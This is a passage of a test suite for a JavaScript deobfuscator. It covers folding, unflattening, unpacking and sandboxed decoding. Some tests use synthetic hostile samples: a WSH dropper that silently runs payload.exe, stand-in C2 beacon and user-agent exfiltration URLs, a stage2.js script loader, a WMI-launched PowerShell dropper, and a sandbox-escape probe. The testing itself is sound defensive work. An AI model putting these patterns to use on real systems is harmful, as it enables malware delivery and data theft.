import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import vm from 'node:vm';
import { createRequire } from 'node:module';
import { deobfuscate } from '../src/index.js';
import { generate } from '../src/codegen.js';
import { parse } from '../src/ast.js';

const norm = (code) => generate(parse(code).ast);
// most tests exercise the full pipeline; static-only behaviour is tested explicitly below
const deob = (code, opts) => deobfuscate(code, { dynamic: true, ...opts }).code;
const same = (input, expected, opts) => assert.equal(deob(input, opts), norm(expected));
const unchanged = (input, opts) => same(input, input, opts);

// ---------- static transforms ----------

test('constant folding', () => {
  same("x(!![], ![], 0x10 + 1, 'a' + 'b', void 0, typeof 'q', -(-1), `t${1 + 1}`);",
    "x(true, false, 17, 'ab', undefined, 'string', 1, 't2');");
});

test('computed members and keys', () => {
  same("a['b']['c'](); o = {'k': 1, ['m']: 2};", 'a.b.c(); o = {k: 1, m: 2};');
  unchanged("o = {['__proto__']: 1}; a['not-ident'];");
});

test('dead branches keep hoisted vars', () => {
  same('if (1 === 1) { a(); } else { b(); }', 'a();');
  same("if ('x' === 'y') { var v = 1; } v = 2; use(v);", 'use(2);');
  same("if ('x' === 'y') { var v = 1; } if (c) { v = 2; } use(v);", 'var v; if (c) { v = 2; } use(v);');
  same('x = true ? a : b; y = false || c; z = 0 && d;', 'x = a; y = c; z = 0;');
});

test('sequence splitting', () => {
  same('function f() { return a(), b(), c; }', 'function f() { a(); b(); return c; }', { removeDeadCode: false });
  same('a(), b();', 'a(); b();');
});

test('constant inlining respects reassignment, hoisting and shadowing', () => {
  same("var s = 'x'; f(s);", "f('x');");
  unchanged("var s = 'x'; if (c) { s = g(); } f(s);");
  same("var s = 'x'; s = g(); f(s);", 'f(g());'); // straight-line reassignment: new binding, then a single-use temp
  same("var s = 'x'; s = g(); h(); f(s);", 'var s_1 = g(); h(); f(s_1);'); // h() in between: stays a binding
  unchanged("f(s); var s = 'x';", { removeDeadCode: false });
  same("var s = 'x'; function g(s) { return s; } h(g, s);", "function g(s) { return s; } h(g, 'x');");
});

test('member access on constant arrays', () => {
  same("var a = ['log', 'hi']; console[a[0]](a[1]);", "console.log('hi');");
  same("x = 'abc'.length + ['p','q'][1];", "x = '3q';");
  unchanged("var a = ['x']; a.push('y'); f(a[0]);"); // mutated: keep
});

test('proxy variables are only inlined when the target resolves identically', () => {
  same('var b = a; b(1);', 'a(1);');
  unchanged('var b = a; function f(a) { return b(a); } g(f);');
});

test('proxy functions', () => {
  same('function w(x, y) { return dec(y - 1, x); } w(k, 5);', 'dec(4, k);');
  // evaluation order of two side-effecting args would change
  unchanged('function f(a, b) { return b + a; } g(f(x(), y()));');
  // recursion is never inlined
  unchanged('function r(n) { return r(n - 1); } g(r(3));');
});

test('proxy objects', () => {
  same("var o = {'aB': function (a, b) { return a + b; }, 'cD': 'log'}; console[o['cD']](o['aB'](q, 1));",
    'console.log(q + 1);');
  unchanged("var o = {aB: 'x'}; o.aB = 'y'; f(o.aB);"); // written: keep
});

test('control flow unflattening', () => {
  same("var o = '2|0|1'.split('|'), i = 0; while (!![]) { switch (o[i++]) { case '0': b(); continue; case '1': return c(); case '2': a(); continue; } break; }",
    'a(); b(); return c();');
  // a loose `break` inside a case would change meaning: leave it alone
  const loose = "var o = ['1','0'], i = 0; while (true) { switch (o[i++]) { case '0': if (x) break; b(); continue; case '1': a(); continue; } break; }";
  assert.match(deob(loose), /switch/);
});

test('eval and Function shells', () => {
  same("eval('a(1); b(2);');", 'a(1); b(2);');
  same("x = eval('1 + y');", 'x = 1 + y;');
  same("Function('g(1)')();", '(function () { g(1); })();');
  // the body would capture the local `g` if inlined
  const local = "function f(g) { Function('g(1)')(); } h(f);";
  assert.match(deob(local), /Function\(/);
});

// ---------- sandboxed transforms ----------

test('builtin calls on literals', () => {
  same("x = 'dlrow'.split('').reverse().join('') + String.fromCharCode(33) + atob('aGk=') + parseInt('0x1f');",
    "x = 'world!hi31';");
  unchanged("x = 'aaa'.replace(/a+/g, 'b');", { dynamic: false }); // regex: sandbox only
});

test('decoder calls: deterministic, side-effect free only', () => {
  same("function d(i) { return ['a', 'b', 'c'][i - 10]; } x = d(11) + d(12);", "x = 'bc';");
  // writes global state -> not a decoder
  const se = 'var n = 0; function f(k) { n++; return k; } x = f(1); report(n);';
  assert.match(deob(se), /f\(1\)/);
  // non-deterministic
  const nd = deob('function r(k) { var t = Math.random(); return t * k; } x = r(1);');
  assert.match(nd, /Math\.random\(\)/); // inlined, never evaluated
  assert.doesNotMatch(nd, /x = [\d.]+;/);
  // safe mode never evaluates
  assert.match(deob("function d(i) { var s = ''; for (var j = 0; j < i; j++) { s += 'a'; } return s; } x = d(2);", { dynamic: false }), /d\(2\)/);
});

test('sandbox has no host access', () => {
  const code = "function p(k) { var P = this.constructor.constructor('return process')(); return typeof P + k; } x = p(1);" +
    "function q(k) { var t = ''; for (var i = 0; i < 2; i++) { t += typeof require; } return t + typeof process + k; } y = q('!');";
  const out = deob(code);
  assert.match(out, /x = p\(1\)/); // ReferenceError inside the sandbox -> left alone
  assert.match(out, /y = 'undefinedundefinedundefined!'/);
});

// ---------- end to end ----------

function behaviour(code) {
  const log = [];
  const ctx = {
    navigator: { userAgent: 'UA', language: 'fr' },
    localStorage: { getItem: (k) => (log.push(['getItem', k]), null), setItem: (k, v) => log.push(['setItem', k, typeof v]) },
    JSON, Math, decodeURIComponent, parseInt, String,
    console: { log: (...a) => log.push(['log', ...a]) },
    fetch: (u, o) => {
      log.push(['fetch', u, o.method, o.body.replace(/"id":"[^"]+"/, '"id":X')]);
      return { then(f) { f({ status: 200 }); return { catch() {} }; } };
    },
  };
  vm.createContext(ctx);
  vm.runInContext(code, ctx);
  return log;
}

test('obfuscator.io-style sample: fully recovered, same behaviour', () => {
  const src = fs.readFileSync(new URL('../samples/obfuscated.js', import.meta.url), 'utf8');
  const out = deob(src);
  assert.deepEqual(behaviour(out), behaviour(src));
  assert.doesNotMatch(out, /_0x4f1e|_0x3b2a|_0x2a91|_0x19c7|switch/);
  assert.match(out, /fetch\('https:\/\/c2\.example\.invalid\/beacon'/);
  assert.match(out, /localStorage\.setItem\('uid'/);
});

test('Dean Edwards packer: eval(function(p,a,c,k,e,d){...}) is unpacked', () => {
  const src = fs.readFileSync(new URL('../samples/packed.js', import.meta.url), 'utf8');
  const out = deob(src);
  assert.doesNotMatch(out, /eval|function \(p, a, c, k/);
  assert.match(out, /document\.write\('<script src="https:\/\/cdn\.example\.invalid\/stage2\.js"><\/script>'\)/);
  assert.match(out, /beacon\.src = 'https:\/\/c2\.example\.invalid\/p\?u=' \+ encodeURIComponent\(navigator\.userAgent\)/);
});

test('WSH junk-char dropper pattern (synthetic)', () => {
  const src = `
    var s = "♉W♉S♉c♉r♉i♉p♉t♉.♉S♉h♉e♉l♉l"; var n = s.split("♉").join(""); var sh = new ActiveXObject(n);
    var d = sh.SpecialFolders("MyDocuments");
    var J = 'x'; function cIXf(a) { J += 'noise'; } var J = 'y'; function cIXf(b) { J += 'more'; }
    var g = {}; var k = 'K'; g[k] = { a: ['junk'] };
    function rev(t) { var a = t.split(""); var b = a.reverse(); return b.join(""); }
    var p = d + "\\\\" + rev("♉♉♉exe.daolyap♉♉♉");
    var q = 'aGVs?bG8!'; var q1 = q.split('?').join(''); var q2 = q1.split('!').join(''); el.text = q2;
    var q = 'd29y?bGQ='; var q1 = q.split('?').join(''); var q2 = q1.split('!').join(''); el2.text = q2;
    sh.Run(p.split("♉♉♉").join(""), 0, false);`;
  same(src, `
    var sh = new ActiveXObject('WScript.Shell');
    var p = sh.SpecialFolders('MyDocuments') + '\\\\payload.exe';
    el.text = 'aGVsbG8';
    el2.text = 'd29ybGQ=';
    sh.Run(p, 0, false);`);
});

test('redeclarations are only split when straight-line', () => {
  same("function f() { var s = 'a'; use(s); var s = 'b'; use(s); } g(f);", "function f() { use('a'); use('b'); } g(f);");
  unchanged("function f() { var s = 'a'; g(function () { return s; }); var s = 'b'; use(s); } h(f);");
});

test('dead code: re-declared junk and its writes are removed together', () => {
  same("var J = 'x'; function n(a) { J += 'a'; } var J = 'y'; function n(b) { J += 'b'; } go();", 'go();');
  same("var J = 'x'; J += 'a'; use(J);", "use('xa');"); // a live accumulator folds (0.5.0)
});

test('input decoding: UTF-16 (BOM / no BOM), UTF-8 BOM, ANSI, JScript.Encode', async () => {
  const { decodeSource } = await import('../src/input.js');
  const s = "var x = 'héllo € ♉';";
  const le = Buffer.from(s, 'utf16le');
  const be = Buffer.from(le); be.swap16();
  assert.equal(decodeSource(Buffer.concat([Buffer.from([0xff, 0xfe]), le])).code, s);
  assert.equal(decodeSource(Buffer.concat([Buffer.from([0xfe, 0xff]), be])).code, s);
  assert.equal(decodeSource(le).code, s);
  assert.equal(decodeSource(Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from(s)])).code, s);
  assert.equal(decodeSource(Buffer.from([0x76, 0x3d, 0x27, 0xe9, 0x80, 0x27])).code, "v='é€'");
  assert.throws(() => decodeSource(Buffer.from('#@~^MwAAAA==abc^#~@')), /JScript\.Encode/);
});

function wshTrace(code) {
  const log = [];
  const obj = (name) => {
    switch (name) {
      case 'WScript.Shell': return { ExpandEnvironmentStrings: (s) => s.replace('%TEMP%', 'C:\\Temp') };
      case 'Scripting.FileSystemObject': return { GetTempName: () => 'radB1234.tmp',
        CreateTextFile: (p) => ({ Write: (d) => log.push(['write', p, d]), Close() {} }) };
      case 'WbemScripting.SWbemLocator': return { ConnectServer: () => ({
        Get: (cls) => cls === 'Win32_Process'
          ? { Methods_: { Item: () => ({ InParameters: { SpawnInstance_: () => ({}) } }) },
            ExecMethod_: (m, p) => log.push(['exec', m, p.CommandLine, p.ProcessStartupInformation.ShowWindow]) }
          : { SpawnInstance_: () => ({}) } }) };
      default: throw new Error('unexpected ActiveX ' + name);
    }
  };
  const ctx = { ActiveXObject: function (n) { return obj(n); }, WScript: { Echo() {}, Quit() { throw { quit: true }; } }, Date, Math, String, parseInt };
  vm.createContext(ctx);
  try { vm.runInContext(code, ctx); } catch (e) { if (!e || !e.quit) throw e; }
  return log;
}

test('WSH -> PowerShell dropper (synthetic): junk globals, reassigned blob, decode loop, WMI launch', () => {
  const src = fs.readFileSync(new URL('../samples/wsh-ps1.js', import.meta.url), 'utf8');
  const out = deob(src);
  assert.deepEqual(wshTrace(out), wshTrace(src));
  // line endings normalised: git (or `git am`) may rewrite CRLF in the expectation file
  const expected = fs.readFileSync(new URL('../samples/wsh-ps1.expected.ps1', import.meta.url), 'utf8').replace(/\r\n/g, '\n');
  const written = wshTrace(out).find((e) => e[0] === 'write')[2].replace(/\r\n/g, '\n');
  assert.equal(written, expected, 'decoded PowerShell matches');
  assert.match(out, /f\.Write\('Write-Output/, 'decoded PowerShell is a literal in the output');
  assert.doesNotMatch(out, /this\.|for \(|split\(|neverDefined|decoy/);
  assert.ok(out.split('\n').length < 40);
});

test('constant loops: only self-contained, deterministic loops are evaluated', () => {
  same("function f() { var o = ''; for (var i = 0; i < 3; i++) { o += String.fromCharCode(97 + i); } return o; } g(f);",
    "function f() { return 'abc'; } g(f);");
  // calls user code
  assert.match(deob('function f() { var o = 0; for (var i = 0; i < 3; i++) { o += h(i); } return o; } g(f);'), /for \(/);
  // reads a non-constant
  assert.match(deob('function f(n) { var o = 0; for (var i = 0; i < n; i++) { o += i; } return o; } g(f);'), /for \(/);
  // non-deterministic
  assert.match(deob('function f() { var o = 0; for (var i = 0; i < 3; i++) { o += Math.random(); } return o; } g(f);'), /for \(/);
  // loop variable used afterwards
  assert.match(deob("function f() { var o = ''; for (var i = 0; i < 3; i++) { o += 'x'; } return o + i; } g(f);"), /for \(/);
  // safe mode never evaluates
  assert.match(deob("function f() { var o = ''; for (var i = 0; i < 3; i++) { o += 'x'; } return o; } g(f);", { dynamic: false }), /for \(/);
});

test('global this.X junk: removed only when never read', () => {
  same("this.a = 'x'; this.b = a === 'x'; this.o = {k: 1}; o.k++; var t = new Date().getTime(); var u = t > 0; go();", 'go();');
  unchanged("this.a = 'x'; use(a);");
  unchanged("this.a = 'x'; use(this.a);");
  unchanged("this.a = 'x'; this.a = g(); go();");
  unchanged("this.a = 'x'; var k = h(); use(this[k]);"); // computed global access: keep everything
});

test('unreachable code after return / WScript.Quit()', () => {
  same('function f() { a(); return 1; b(); } h(f);', 'function f() { a(); return 1; } h(f);');
  same('function f() { WScript.Quit(); if (z) { d(); } } h(f);', 'function f() { WScript.Quit(); } h(f);');
  unchanged('function f(WScript) { WScript.Quit(); more(); } h(f);');
});

test('static by default: nothing runs without dynamic, pending work is reported', () => {
  const src = fs.readFileSync(new URL('../samples/obfuscated.js', import.meta.url), 'utf8');
  const r = deobfuscate(src);
  assert.equal(r.dynamic, false);
  assert.match(r.code, /_0x4f1e\(/); // decoder calls untouched
  assert.ok(r.pending.resolveDecoderCalls > 0);
  const d = deobfuscate(src, { dynamic: true });
  assert.deepEqual(d.pending, {});
  assert.doesNotMatch(d.code, /_0x4f1e/);
  // pre-0.4 option name still works
  assert.doesNotMatch(deobfuscate(src, { unsafe: true }).code, /_0x4f1e/);
});

test('static builtin folding: literal string ops only, never regex, never mutating a shared array', () => {
  const st = (c) => deobfuscate(c).code;
  assert.equal(st("x = 'dlrow'.split('').reverse().join('') + String.fromCharCode(33) + atob('aGk=');"), norm("x = 'world!hi';"));
  assert.equal(st("var b = 'a#b'; use(b.split('#').join(''));"), norm("use('ab');"));
  assert.match(st("x = 'aaa'.replace(/a+/g, 'b');"), /replace\(\/a\+\/g/);
  assert.match(st("x = 'x'.repeat(1e9);"), /repeat/);
  assert.match(st("x = 'abc'.replace('b', function () { return evil(); });"), /evil/);
  for (const dynamic of [false, true]) {
    const out = deobfuscate('var a = [3,1,2]; x = a.reverse().join(); y = a.join(); r(x, y);', { dynamic }).code;
    assert.match(out, /a\.reverse\(\)\.join\(\), a\.join\(\)/, `mutated array must not be folded (dynamic=${dynamic})`);
    assert.doesNotMatch(out, /'[123],[123],[123]'/);
  }
});

test('self-feeding junk variable: removed when only it reads itself, kept when really used', () => {
  const K = '"k"';
  const junk = [
    `if (/k/.test(p || "")) { p += ${K}; } else { p = ${K}; }`,
    `try { p = p.concat(${K}); } catch (e) { p = ${K}; }`,
    `switch (typeof p) { case "string": p += ${K}; break; default: p = ${K}; }`,
    `p = (function (q) { return (q || "") + ${K}; })(p);`,
    `p = (p && p.indexOf(${K}) !== -1) ? p + ${K} : ${K};`,
    `var p = ${K}; p = String(p || "").concat(p);`,
    `var p = [p || "", ${K}]; p = p.join("");`,
    `for (var p = 0; p < 1; p++) { p = (p || "") + ${K}; }`,
  ].join('\n');
  const wrap = (tail) => `function f() {\n${junk}\n${tail}\n}\nf();`;
  assert.equal(deobfuscate(wrap('run("x");')).code, norm('run("x");')); // junk gone, then the wrapper inlines
  assert.match(deobfuscate(wrap('run(p);')).code, /concat/);
  // a write to anything else, or a call with effects, keeps the statement
  assert.match(deobfuscate(wrap('if (p) { other = 1; } run("x");')).code, /other = 1/);
  assert.match(deobfuscate(wrap('p = p + log(); run("x");')).code, /log\(\)/);
});

test('static: += accumulators, join loops over constant string arrays, plain-literal regexes', () => {
  const st = (c) => deobfuscate(c).code;
  assert.equal(st("var c = ''; c += 'a'; c += 'b'; use(c);"), norm("use('ab');"));
  assert.equal(st("var a = ['', 'w', 'in']; var s = ''; for (var i = 0; i < a.length; i++) { s += a[i]; } use(s);"), norm("use('win');"));
  assert.equal(st(`try {
    var c = ''; c += 'aXXb'; c += 'cXXd';
    var p = c.split('XX'); var o = '';
    for (var i = 0; i < p.length; i++) { o += p[i]; }
    run(('xXX' + o.replace(/'/g, "''") + 'XXy').split('XX').join(''));
  } catch (e) {}`), norm("try { run('xabcdy'); } catch (e) {}"));
  // not provably strings / counter used later / array changed / real regexes: left alone
  assert.match(st('var a = [1, , 3]; var s = ""; for (var i = 0; i < a.length; i++) { s += a[i]; } use(s);'), /for \(/);
  assert.match(st('var a = ["x"]; var s = ""; for (var i = 0; i < a.length; i++) { s += a[i]; } use(s, i);'), /for \(/);
  assert.match(st('var a = ["x"]; a[0] = f(); var s = ""; for (var i = 0; i < a.length; i++) { s += a[i]; } use(s);'), /for \(/);
  assert.match(st("x = 'a.b'.split(/./);"), /split\(\/\.\//);
  assert.equal(st("var s = 'a'; s += s; use(s);"), norm("use('aa');"));
});

test('literal append runs merge before SSA; huge and deep chains stay fast and never crash', () => {
  const st = (c) => deobfuscate(c);
  assert.equal(st("var s = ''; s += 'ab'; var k = 1; s += 'cd'; use(s, k);").code, norm("use('abcd', 1);"));
  // a read between appends splits the run
  assert.equal(st("var s = 'a'; s += 'b'; log(s); s += 'c'; use(s);").code, norm("log('ab'); use('abc');"));
  // a call in between that could read s through a nested function: left as the SSA pass decides
  assert.match(st("var s = 'a'; function g() { return s; } s += 'b'; use(g(), s);").code, /s \+= 'b'|s = 'ab'|'ab'/);
  let lit = "var s = '';\n"; for (let i = 0; i < 20000; i++) lit += `s += 'x${i % 10}';\n`;
  const r1 = st(lit + 'use(s);');
  assert.deepEqual(r1.problems, []);
  assert.match(r1.code, /^use\('x0x1x2/);
  let dyn = "var s = '';\n"; for (let i = 0; i < 5000; i++) dyn += `s += f(${i % 7});\n`;
  const t0 = Date.now();
  const r2 = st(dyn + 'use(s);');
  assert.deepEqual(r2.problems, []);
  assert.ok(Date.now() - t0 < 20000);
});

test('dead array mutations, single-use temps, statement-body proxies', () => {
  const st = (c) => deobfuscate(c).code;
  // junk arrays only ever mutated in place
  assert.equal(st('var a = [1]; a.push(2); a.unshift("x"); a.reverse(); function f() { a.push(3); } f(); go();'), norm('go();'));
  assert.match(st('var a = []; a.push(1); use(a);'), /a\.push\(1\)/);                       // really read
  assert.match(st('var a = b; a.push(1);'), /\.push\(1\)/);                                     // may alias b
  assert.match(st('var a = [2, 1]; a.sort(function (x, y) { log(); return x - y; });'), /log\(\)/); // callback runs
  assert.match(st('var a = []; a.push(f());'), /f\(\)/);                                       // argument has effects
  // single-use temporaries
  assert.equal(st('t = dec(x); eval2(t);'), norm('eval2(dec(x));'));
  assert.equal(st('function g(a) { var r = f(a); return r; } use(g);'), norm('function g(a) { return f(a); } use(g);'));
  assert.match(st('t = f(); g(h(), t);'), /t = f\(\)/);           // h() would run first
  assert.match(st('t = f(); if (c) { use(t); }'), /t = f\(\)/);    // read under a branch
  assert.match(st('t = f(); other(); use(t);'), /t = f\(\)/);      // not adjacent
  assert.match(st('t = f(); use(t); use(t);'), /t = f\(\)/);       // read twice
  assert.match(st('t = f(); use(t); this[k]();'), /t = f\(\)/);    // globals reachable by name
  assert.match(st('t = f(); use(n, t); n = 1;'), /t = f\(\)/);     // n is written somewhere
  assert.equal(st('t = f(); use(1, t); n = 2;'), norm('use(1, f()); n = 2;'));
  assert.equal(st('function g() { var q = f(); var r = h(q, 1); return [r, r]; } use(g);'), norm('function g() { var r = h(f(), 1); return [r, r]; } use(g);')); // read in a var initialiser
  assert.match(st('function g() { var q = f(); var r = h(k(), q); return [r, r]; } use(g);'), /var q = f\(\)/);
  assert.match(st('function g() { var o = { a: x() }; return h(o); } use(g);'), /var o = \{/); // literals stay bound
  // statement-body proxies
  assert.equal(st('function w(p) { log(p); } w(1); w(2);'), norm('log(1); log(2);'));
  assert.match(st('function w(p) { log(p); } x = w(1);'), /w\(1\)/);        // result used: undefined, keep
  assert.match(st("function w(p) { var k = 1; eval(p); } w('k');"), /function w/); // eval sees a local
  assert.equal(st("function w(p) { eval(p); } w('go()');"), norm('go();'));
});

test('dead IIFEs that only write onto their own fresh arguments', () => {
  const st = (c) => deobfuscate(c).code;
  assert.equal(st('(function (a, b) { a[b] = { x: [1, 2], y: "s" }; }(function (c, k) { c[k] = { z: 1 }; })); go();'), norm('go();'));
  assert.equal(st('!function (a) { a.t = [1]; a.u = "v"; }({}); go();'), norm('go();'));
  assert.equal(st('(function (a) { var t = { q: 1 }; a.x = t; }({})); go();'), norm('go();'));
  const kept = [
    '(function (a) { a.name = 1; }(function () {}));',             // read-only on functions (TypeError in strict mode)
    '(function (a) { a.x = 1; }({ set x(v) { evil(); } }));',      // setter runs
    '(function (a) { a.x = f(); }({}));',                         // value has effects
    '(function (a) { a.x = 1; }(g));',                            // not a fresh argument
    '(function (a) { a.x = 1; use(a); }({}));',                   // parameter escapes
    '(function (a, k) { a[k] = 1; }({}, f()));',                  // argument has effects
    '(function (a) { a.length = -1; }([]));',                     // RangeError
    '(function (a) { a.__proto__ = 1; }({}));',                   // prototype change
    '(function (a) { a.x = 1; eval(s); }({}));',                  // eval
    '(function (a) { a.x = 1; log(); }({}));',                    // any other statement
  ];
  for (const c of kept) assert.match(st(c + ' go();'), /function \(a/, c);
});

test('empty branches', () => {
  const st = (c) => deobfuscate(c).code;
  assert.equal(st('if (f(a)) {} else { g(); }'), norm('if (!f(a)) { g(); }'));
  assert.equal(st('if (!f(a)) {} else { g(); }'), norm('if (f(a)) { g(); }'));
  assert.equal(st('if (f(a)) { g(); } else {}'), norm('if (f(a)) { g(); }'));
  assert.equal(st('if (f(a)) {}'), norm('f(a);'));                          // condition's effects kept
  assert.equal(st('if (f(a)) {} else if (b()) { g(); } else { h(); }'), norm('if (f(a)) {} else if (b()) { g(); } else { h(); }')); // chains stay flat
});

test('blob language labels', async () => {
  const { textLanguage } = await import('../src/blobs.js');
  assert.equal(textLanguage('local a = 1\nlocal b = 2\nlocal function f(x)\n if x then return 1 elseif x ~= 2 then return 2 end\nend\n'), 'Lua source');
  assert.equal(textLanguage('$a = 1; $b = New-Object Net.WebClient; $c = [Convert]::FromBase64String($s)'), 'PowerShell');
  assert.equal(textLanguage('Dim a\nSet sh = CreateObject("WScript.Shell")\nIf a Then\nEnd If\n'), 'VBScript');
  assert.equal(textLanguage('var a = 1; let b = 2; const c = () => a === b; function f() { if (a) { return { a: 1 }; } return c(); }'), 'JavaScript');
  assert.equal(textLanguage('<?xml version="1.0"?><a/>'), 'XML');
  assert.equal(textLanguage('the end of the local news, then nothing. '.repeat(40)), null);
  assert.equal(textLanguage('QUJD'.repeat(500)), null);
  // a packed script that opens with one long data literal is still recognised
  assert.equal(textLanguage('local T = "' + 'x'.repeat(200000) + '"\nlocal a = 1\nlocal b = 2\nif a then b = 3 elseif b ~= 1 then a = 2 end\nlocal function g() end\n'), 'Lua source');
});

test('--rename: readable names from use, never changing behaviour', () => {
  const rn = (c, mode = 'auto', extra = {}) => deobfuscate(c, { rename: mode, ...extra }).code;
  assert.equal(rn('(function () { function _0x1a2b(_0x3c4d) { if (_0x3c4d <= 1) return _0x3c4d; return _0x1a2b(_0x3c4d - 1) + _0x1a2b(_0x3c4d - 2); }' +
    " for (var _0x5e6f = 0; _0x5e6f < 10; _0x5e6f++) { console.log('F(' + _0x5e6f + ') = ' + _0x1a2b(_0x5e6f)); } }());"),
  norm("(function () { function fn1(arg1) { if (arg1 <= 1) return arg1; return fn1(arg1 - 1) + fn1(arg1 - 2); }" +
    " for (var i = 0; i < 10; i++) { console.log('F(' + i + ') = ' + fn1(i)); } }());"));
  // usage-based names for COM objects, paths, urls, catch params
  const out = rn("var ABCDEFGH1234 = new ActiveXObject('WScript.Shell'); var ABCDEFGH5678 = new ActiveXObject('Scripting.FileSystemObject');" +
    " var ABCDEFGH9012 = ABCDEFGH1234.ExpandEnvironmentStrings('%TEMP%') + '\\\\x.exe'; var ABCDEFGH3456 = 'https://e.x/' + ABCDEFGH1234.k;" +
    ' try { ABCDEFGH5678.f(ABCDEFGH9012, ABCDEFGH3456); } catch (ABCDEFGH7890) { log(ABCDEFGH7890); }');
  assert.match(out, /var shell = new ActiveXObject/);
  assert.match(out, /var fso = new ActiveXObject/);
  assert.match(out, /var exePath = shell\.ExpandEnvironmentStrings/);
  assert.match(out, /var url = 'https:\/\/e\.x\/' \+ shell\.k/);
  assert.match(out, /catch \(err\)/);
  // human-looking names stay unless --rename-all
  assert.match(rn('function f(count) { var total = count + 1; return total; } use(f);'), /count/);
  assert.doesNotMatch(rn('function f(count) { var total = count + 1; return total; } use(f);', 'all'), /count|total/);
  // never: implicit globals, properties, eval-visible locals, globals reachable by name
  assert.match(rn('_0xabc = f(); use(g(), _0xabc);'), /_0xabc/);
  assert.match(rn('var o = { _0xabc: f() }; use(o._0xabc, o);', 'all'), /_0xabc: f\(\)[\s\S]*\._0xabc/);
  assert.match(rn('function f(_0xabc) { eval(s); return _0xabc; } use(f);'), /_0xabc/);
  assert.match(rn('var _0xabc = f(); eval(s); use(_0xabc);'), /_0xabc/);
  assert.match(rn('var _0xabc = f(); use(this[k], _0xabc);'), /_0xabc/);
  assert.match(rn('var _0xabc = f(); use(g(), _0xabc);', 'auto', { keepGlobals: true }), /_0xabc/);
  assert.match(rn('var _0xabc = f(); use(g(), _0xabc);'), /var v1 = f\(\)/);  // same code, renamed without keepGlobals
  // shorthand properties keep their key
  assert.match(rn('function f(_0xabc) { return { _0xabc }; } use(f);'), /_0xabc: arg1/);
  // new names never collide with existing ones (fn1 taken -> fn2)
  assert.match(rn('var fn1 = g(); function _0xabc() { return fn1; } use(_0xabc);'), /function fn2\(\) \{\s*return fn1;/);
  // names are looked up as own keys: toString / constructor never become names
  const proto = rn('function f(_0xabc) { var _0xdef = (_0xabc & 255).toString(16); var _0x123 = _0xabc.constructor; return [_0xdef, _0x123, _0xdef, _0x123]; } use(f);');
  assert.match(proto, /var v1 = \(arg1 & 255\)\.toString\(16\)/);
  assert.doesNotMatch(proto, /native code/);
  // off by default
  assert.match(deobfuscate('function f(_0xabc) { return _0xabc * 2; } use(f);').code, /_0xabc/);
});

test('--rename-all keeps real libraries working', () => {
  const require = createRequire(import.meta.url);
  const M = '/opt/node-tools/node_modules/';
  if (!fs.existsSync(M + 'acorn/dist/acorn.js')) return;
  const src = fs.readFileSync(M + 'acorn/dist/acorn.js', 'utf8');
  const r = deobfuscate(src, { rename: 'all' });
  assert.ok(r.renamed > 500, `renamed ${r.renamed}`);
  const file = `${process.env.TMPDIR || '/tmp'}/untangle-renamed-acorn-${process.pid}.cjs`;
  fs.writeFileSync(file, r.code);
  try {
    const probe = fs.readFileSync(M + 'escodegen/escodegen.js', 'utf8');
    const a = JSON.stringify(require(M + 'acorn/dist/acorn.js').parse(probe, { ecmaVersion: 'latest' }));
    const b = JSON.stringify(require(file).parse(probe, { ecmaVersion: 'latest' }));
    assert.equal(a, b);
  } finally { fs.unlinkSync(file); }
});

test('decoder calls with constant arguments: nested calls, literal arrays, constant strings, f(...).length', () => {
  const prelude = 'function unpack(s) { var o = []; for (var i = 0; i < s.length; i++) o.push(s.charCodeAt(i) - 1); return o; }' +
    ' function derive(b, k) { var r = ""; for (var i = 0; i < b.length; i++) r += String.fromCharCode(b[i] ^ k[i % k.length]); return r; }' +
    ' function pick(buf, off, x) { var r = ""; for (var i = 0; i < x.length; i++) r += String.fromCharCode(buf.charCodeAt(off + i) ^ x[i]); return r; }' +
    ' function keep(a) { var o = []; for (var i = 0; i < a.length; i++) if (a[i]) o.push(a[i]); return o; }';
  const out = deob(prelude + ' function run() { var buf = derive(unpack("IFMMP!XPSME"), [1, 2]); var a = [pick(buf, 0, [1, 2, 3]), pick(buf, 3, [0, 0])];' +
    ' if (keep(["x", "y", ""]).length > 1) WScript.Echo(a.join("|")); } run();');
  assert.equal(out, norm("WScript.Echo('HEN|NN');"));
  // an array bound to a name may be mutated by the call: not a constant argument
  assert.match(deob(prelude + ' var arr = ["x", "", "y"]; function run() { use(keep(arr).length, arr); } run();'), /keep\(arr\)/);
  // static mode never evaluates any of it
  assert.match(deob(prelude + ' WScript.Echo(derive(unpack("IFMMP"), [1, 2]));', { dynamic: false }), /derive\(unpack/);
});

test('--extract-blobs leaves no manifest when nothing was extracted', async () => {
  const { extractBlobs } = await import('../src/blobs.js');
  const dir = fs.mkdtempSync(`${process.env.TMPDIR || '/tmp'}/untangle-blobs-`);
  try {
    const r = extractBlobs('var a = "short";', dir);
    assert.equal(r.blobs.length, 0);
    assert.equal(fs.existsSync(`${dir}/manifest.json`), false);
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test('hoisted declarations are put back; constants only reach reads that surely run after them', () => {
  const st = (c) => deobfuscate(c).code;
  // obfuscator pattern: `x = v` with a bare `var x` at the end of the function
  assert.equal(st('function f() { x = g(); use(x, x); var x; } h(f);'), norm('function f() { var x = g(); use(x, x); } h(f);'));
  assert.equal(st('function d(i) { return [i]; } function f() { a = d; return [a(1), a(2)]; var a; } h(f);'),
    norm('function f() { return [[1], [2]]; } h(f);')); // the alias goes, then the proxy function too
  assert.match(st('function f() { if (c) { x = g(); } use(x, x); var x; } h(f);'), /var x;/);    // not from inside a branch
  // a declaration in a branch does not reach reads after the branch
  assert.equal(st('if (c) { var x = "a"; } log(x);'), norm("if (c) { var x = 'a'; } log(x);"));
  // a hoisted function called before the declaration sees undefined
  assert.equal(st('f(); var x = "a"; function f() { log(x); }'), norm("log(x); var x = 'a';"));
  assert.equal(st('g(); var x = "a"; function f() { log(x); } function g() { f(); }'), norm("log(x); var x = 'a';"));
  assert.equal(st('var y = f; y(); var x = "a"; function f() { log(x); }'), norm("log(x); var x = 'a';"));
  // ... but one only called afterwards is fine, and so is a function declared inside a later block
  assert.equal(st('h(); var x = "a"; function f() { log(x); } function h() {} f();'), norm("h(); function h() { } log('a');"));
  assert.equal(st('f(); var x = "a"; try { function g() { log(x); } g(); } catch (e) {}'), norm("f(); try { log('a'); } catch (e) { }"));
  // this[k]() may call any global function: nothing global is removed or inlined into it
  assert.match(st('this[k](); var x = "a"; function f() { log(x); } f();'), /function f\(\) \{\s*log\(x\);/);
});

test('unused decoder machinery is removed only when it touches nothing else', () => {
